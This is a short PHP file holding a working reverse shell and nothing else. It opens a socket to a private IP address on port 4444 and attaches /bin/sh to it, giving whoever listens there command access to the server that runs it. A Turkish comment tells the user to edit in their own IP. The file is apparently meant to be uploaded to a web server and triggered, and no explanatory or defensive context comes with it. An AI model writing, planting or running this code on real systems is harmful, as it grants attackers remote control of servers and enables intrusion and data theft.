<?php
$ip = '192.168.142.129';  // ← BURAYI KENDİ IP’NE GÖRE DÜZENLE
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
